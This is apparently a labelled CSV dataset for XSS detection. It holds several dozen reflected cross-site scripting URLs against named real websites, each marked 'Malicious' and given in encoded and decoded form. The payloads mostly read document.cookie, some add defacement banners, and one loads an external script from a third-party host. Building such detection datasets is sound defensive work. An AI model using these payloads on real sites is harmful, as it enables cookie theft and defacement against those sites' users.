Payloads,Class,decoded,executed,parser_changed
http://www.systranet.fr/?text=%27%22%3e%3c/textarea%3e%3cscript%3ealert(/xss/)%3c/script%3e%3cmarque<br>e%20bgcolor=%22red%20by%20xylitol%22%3e%3ch1%3exss%3c/h1%3e%3c/marquee%3e&amp;lp=en_fr,Malicious,"http://www.systranet.fr/?text='""></textarea><script>alert(/xss/)</script><marquee bgcolor=""red by xylitol""><h1>xss</h1></marquee>&lp=en_fr",True,True
http://www.ubcdanceclub.com/content.php?sectionid=2&amp;contentid=40&amp;newsid=&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;,Malicious,"http://www.ubcdanceclub.com/content.php?sectionid=2&contentid=40&newsid=""><script>alert(document.cookie)</script>",True,True
http://www.geciktirici.info/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/sc<br>ript%3e,Malicious,"http://www.geciktirici.info/odeme.asp?defurunid=""><script>alert(""document.cookie"")</script>",True,True
http://www.imagine.gr/basketball/index.asp?v=5&amp;t=t&amp;id=1&amp;title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/<br>script&gt;,Malicious,"http://www.imagine.gr/basketball/index.asp?v=5&t=t&id=1&title=<script>alert(""scriptorium(turkey)"")</script>",True,True
http://www.healthcareitnews.com/searchresults.cms?keywords=%3e%22%3e%3cscript%20%3ealert(1337);%3c/s<br>cript%3e&amp;type=local,Malicious,"http://www.healthcareitnews.com/searchresults.cms?keywords=>""><script >alert(1337);</script>&type=local",True,True
http://www.totalsoft.ro/charisma-software-project-management/mainpage|displayresultspage?q=%22%3e%3c<br>script%3ealert(31337)%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious,"http://www.totalsoft.ro/charisma-software-project-management/mainpage|displayresultspage?q=""><script>alert(31337)</script>&x=0&y=0",True,True
http://www.sarilacivert.org.tr/haberara.asp?id=1892&amp;kelime=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.sarilacivert.org.tr/haberara.asp?id=1892&kelime=""><script>alert(""maxwel"")</script>",True,True
http://www.yakinca.bel.tr/fg/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.yakinca.bel.tr/fg/login.asp?folder=&n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.tecnocasa.it/commerciale/txtsearch/searchi.jsp?conf=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.tecnocasa.it/commerciale/txtsearch/searchi.jsp?conf=""><script>alert(""maxwel"")</script>",True,True
http://www.lettersharing.org.uk/search.asp?searwords=%22%3e%27%3e%3cscript%3ealert(123)%3c%2fscript%<br>3e&amp;send=search&amp;search=0&amp;match=0,Malicious,"http://www.lettersharing.org.uk/search.asp?searwords="">'><script>alert(123)</script>&send=search&search=0&match=0",True,True
http://www.armeniansingles.com/sa.php?nowstage=8&amp;nowpage=71&amp;age1=21&amp;age2=%27%27%3cscript%3ealert%28%<br>22xssed%22%29%3c/script%3e&amp;to=2,Malicious,"http://www.armeniansingles.com/sa.php?nowstage=8&nowpage=71&age1=21&age2=''<script>alert(""xssed"")</script>&to=2",True,True
http://www.natro.com/checkout/login4order.asp?ordercommand=&quot;&gt;&lt;script&gt;alert('madworm')&lt;/script&gt;,Malicious,"http://www.natro.com/checkout/login4order.asp?ordercommand=""><script>alert('madworm')</script>",True,True
http://www.keygenmusic.org/?page=search&amp;query='%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3<br>e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;lang=fr,Malicious,"http://www.keygenmusic.org/?page=search&query='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&lang=fr",True,True
http://www.sciam.com/podcast/index.cfm?e_type=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.sciam.com/podcast/index.cfm?e_type=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.hmi.de/bensc/user-info/user-info_en.html%7d%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xs<br>s/.source));%3c/script%3e,Malicious,http://www.hmi.de/bensc/user-info/user-info_en.html}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,True,True
http://www.synonyms.net/synonym/%3cscript%3ealert(123)%3c/script%3e,Malicious,http://www.synonyms.net/synonym/<script>alert(123)</script>,True,True
http://www.psp.state.pa.us/psp/cwp/search.asp?a=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.psp.state.pa.us/psp/cwp/search.asp?a=""><script>alert(""maxwel"")</script>",True,True
http://www.ifilm.com/about/pr/index.jsp?pid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.ifilm.com/about/pr/index.jsp?pid=""><script>alert(""maxwel"")</script>",True,True
http://kisiselbasari.com/forum/hata.asp?hata=%3cscript%3ealert(%22by%20st@rext%22)%3c/script%3e,Malicious,"http://kisiselbasari.com/forum/hata.asp?hata=<script>alert(""by st@rext"")</script>",True,True
http://www.basbakanlik.gov.tr/sour.ce/index.asp?wpg=&lt;script&gt;alert('redworm%20zeberus')&lt;/script&gt;,Malicious,http://www.basbakanlik.gov.tr/sour.ce/index.asp?wpg=<script>alert('redworm zeberus')</script>,True,True
http://www.car.com/content/research/index.cfm?search=%22%3e%3cscript%3ealert('xssed')%3c/script%3e%3<br>cspan%20id=%22&amp;action=search&amp;id=24093%3bccom&amp;submit.x=10&amp;submit.y=5&amp;submit=search,Malicious,"http://www.car.com/content/research/index.cfm?search=""><script>alert('xssed')</script><span id=""&action=search&id=24093;ccom&submit.x=10&submit.y=5&submit=search",True,True
http://www.iddaa.com/iddaacom/haberall/default.asp?id=t2b%22%3e%3cscript%3ealert(%22daimon%22)%3c/sc<br>ript%3e,Malicious,"http://www.iddaa.com/iddaacom/haberall/default.asp?id=t2b""><script>alert(""daimon"")</script>",True,True
http://www.barnesandnoble.com/newsletters/unsubscribe/barnesandnoble.asp?emailaddr=%22%3e%3ciframe%2<br>0src=http://google.com%3e%3c/iframe%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://www.barnesandnoble.com/newsletters/unsubscribe/barnesandnoble.asp?emailaddr=""><iframe src=http://google.com></iframe><script>alert(document.cookie)</script>",True,True
http://revolutionary.tk/a?t=http://www.googleearth4mac.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%7<br>3%63%72%69%70%74%3e%61%6c%65%72%74%28%31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75<br>%65%65%3e%3c%68%31%3e%58%53%53%20%62%79%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%<br>65%65%3e&amp;c=1&amp;p=1&amp;r=1186880594051+nsync&amp;c=1&amp;p=1&amp;r=1196836952457,Malicious,"http://revolutionary.tk/a?t=http://www.googleearth4mac.tk/a?t='""></title><script>alert(1337)</script>><marquee><h1>XSS by XYLITOL</h1></marquee>&c=1&p=1&r=1186880594051 nsync&c=1&p=1&r=1196836952457",True,True
https://secure.registerapi.com/dds2/index.php?siteid=42566&amp;domainname=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert('xss'<br>)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"https://secure.registerapi.com/dds2/index.php?siteid=42566&domainname=""></script><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://49.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://49.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://www.biohealthbase.org/gsearch/news.jsp?decorator=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.biohealthbase.org/gsearch/news.jsp?decorator=""><script>alert(""maxwel"")</script>",True,True
http://www.melisaeczacibasi.com/bayan.php?orta=bleke?ref=''&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;'&gt;&lt;h1&gt;hackednarcoticxs&lt;/h1&gt;,Malicious,http://www.melisaeczacibasi.com/bayan.php?orta=bleke?ref=''></script><script>alert(document.cookie)</script>'><h1>hackednarcoticxs</h1>,True,True
http://www.spaviv.es/usuario/ingresar.php?redireccion=%22%3e%3cscript%3ealert%28document.cookie%29%3<br>c/script%3e,Malicious,"http://www.spaviv.es/usuario/ingresar.php?redireccion=""><script>alert(document.cookie)</script>",True,True
http://www.garzantigrandiopere.it/ggo/catalogo/search.jsp?q=gotcha&amp;m=&amp;t=&amp;a=%22%3e%3cscript%3ealert%2<br>8%27brought+to+you+by+xscoffee%27%29%3c%2fscript%3e%3cbr%3e%3c%2ftd%3e%3c%2ftr%3e%3ctr%3e%3ctd%3e%3c<br>%2ftd%3exss+by%3a%3c%2ftr%3e%3cinput+type%3d%22text%22+value%3d%22xscoffee,Malicious,"http://www.garzantigrandiopere.it/ggo/catalogo/search.jsp?q=gotcha&m=&t=&a=""><script>alert('brought to you by xscoffee')</script><br></td></tr><tr><td></td>xss by:</tr><input type=""text"" value=""xscoffee",True,True
http://surfpack.com/li_wikipedia_&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,http://surfpack.com/li_wikipedia_><script>alert(document.cookie)</script>,True,True
http://www.mundopt.com/user_detail.php?u=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.mundopt.com/user_detail.php?u=""><script>alert(document.cookie)</script>",True,True
http://search.lycos.com/?query=%3c%2ftitle%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e,Malicious,http://search.lycos.com/?query=</title><script>alert('xss');</script>,True,True
http://www.filebank.co.jp/cgi-bin/main/login_form.cgi?returl=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61<br>%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%<br>32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2<br>c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://www.filebank.co.jp/cgi-bin/main/login_form.cgi?returl="">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://customersupport.ea.com/loginapp/forgotscreenname.do?locale=%22%3e%3cscript%3ealert(/sh0ck/)%3<br>c/script%3e&amp;curl=aaaaaaa,Malicious,"http://customersupport.ea.com/loginapp/forgotscreenname.do?locale=""><script>alert(/sh0ck/)</script>&curl=aaaaaaa",True,True
http://www.vedanta.edu.in/page.php?id=14&amp;sid=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%<br>3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.vedanta.edu.in/page.php?id=14&sid='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://whitepages.med.harvard.edu/whitepagespublic.asp?task=mysearch&amp;db=hms&amp;last_name=%22%3e%3cscrip<br>t%3ealert(%22go%20to%20stanford%22)%3c/script%3e%3cx,Malicious,"http://whitepages.med.harvard.edu/whitepagespublic.asp?task=mysearch&db=hms&last_name=""><script>alert(""go to stanford"")</script><x",True,True
"ttp://www.europcarug.com/cgi-bin/feedback.cgi?lang=""><script>alert(document.cookie)</script>",Malicious,"ttp://www.europcarug.com/cgi-bin/feedback.cgi?lang=""><script>alert(document.cookie)</script>",True,True
http://www.hotelash.co.nz/gallery/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.hotelash.co.nz/gallery/folderview.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://sourceforge.net/softwaremap/trove_list.php?form_cat=18&amp;form_cat=18&amp;stquery=%3c%22%3c%3cscript<br>%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscr<br>ipt%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28doc<br>ument.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3<br>c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%2<br>9%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;stquery=%3c%22%3c%3cs<br>cript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%<br>2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%<br>28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c<br>%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.coo<br>kie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;search=search+re<br>sults,Malicious,"http://sourceforge.net/softwaremap/trove_list.php?form_cat=18&form_cat=18&stquery=<""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script>&stquery=<""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script>&search=search results",True,True
http://support.gomposerz.ch/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.com/chat<br>/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(document.c<br>ookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious,"http://support.gomposerz.ch/index.php?<script language=""javascript"" src=""http://kabustr.com/chat/c.js"" type=""text/javascript"">kabus-kabustr.com-kabus-kabustr.com</script><script>alert(document.cookie);</script><script>alert(/kabus/);</script>",True,True
http://customer.tochka.ru/zpublic/information?src=stream_registration&amp;form_name=step1&amp;action=go&amp;phon<br>e=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylito<br>l%3c/h1%3e%3c/marquee%3e,Malicious,"http://customer.tochka.ru/zpublic/information?src=stream_registration&form_name=step1&action=go&phone='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://ir.timewarner.com/releases.cfm?ptype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://ir.timewarner.com/releases.cfm?ptype=""><script>alert(""maxwel"")</script>",True,True
http://www.netlingo.com/lookup.cfm?term=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.netlingo.com/lookup.cfm?term=""><script>alert(""maxwel"")</script>",True,True
http://www.microsoft.com/windowsmobile/en-my/searchresults.mspx?st=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e%20:%20%20xss%20vulnerable,Malicious,"http://www.microsoft.com/windowsmobile/en-my/searchresults.mspx?st=""><script>alert(/ar3sw0rmed/);</script> :  xss vulnerable",True,True
http://www.erodatematch.nl/a.cfm?a=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.erodatematch.nl/a.cfm?a=""><script>alert(""maxwel"")</script>",True,True
http://icscotland.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.org<br>/)%3c/script%3e%3cp,Malicious,"http://icscotland.icnetwork.co.uk/search.cfm?query=""><script>alert(/xss - thedefaced.org/)</script><p",True,True
http://www.turkishdailynews.com.tr/apdetailspage.php?id=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;hacked%2<br>0by%20trex/h1&gt;,Malicious,"http://www.turkishdailynews.com.tr/apdetailspage.php?id=""><script>alert('trex')</script><h1>hacked by trex/h1>",True,True
